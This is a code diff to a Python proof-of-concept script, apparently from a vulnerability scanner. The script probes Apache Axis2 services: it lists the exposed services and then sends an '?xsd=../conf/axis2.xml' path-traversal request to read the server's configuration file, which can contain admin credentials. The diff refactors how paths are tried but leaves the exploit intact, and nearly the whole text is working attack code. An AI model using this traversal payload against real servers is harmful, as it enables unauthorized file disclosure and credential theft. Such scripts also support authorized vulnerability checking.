@@ -22,20 +22,18 @@ class POC(Script):
     async def prove(self):
         await self.get_url()
         if self.base_url:
-            path_list = list(set([
-                self.url_normpath(self.base_url, '/axis2/services/'),
-                self.url_normpath(self.base_url, './services/'),
-                self.url_normpath(self.url, './services/'),
-                self.url_normpath(self.url, './axis2/services/'),
-            ]))
-            for path in path_list:
-                url = path + '/listServices'
-                async with ClientSession() as session:
+            async with ClientSession() as session:
+                for path in self.url_normpath(self.url, [
+                    './axis2/services/',
+                    './axis/services/',
+                    './services/',
+                ]):
+                    url = path + 'listServices'
                     async with session.get(url=url) as res:
-                        if res :
+                        if res:
                             text = await res.text()
                             m = re.search('\/axis2\/services\/(.*?)\?wsdl">.*?<\/a>', text)
-                            if m!=None and m.group(1):
+                            if m != None and m.group(1):
                                 server_str = m.group(1)
                                 read_url = path + '/%s?xsd=../conf/axis2.xml' % (server_str)
                                 async with session.get(url=read_url) as res1:
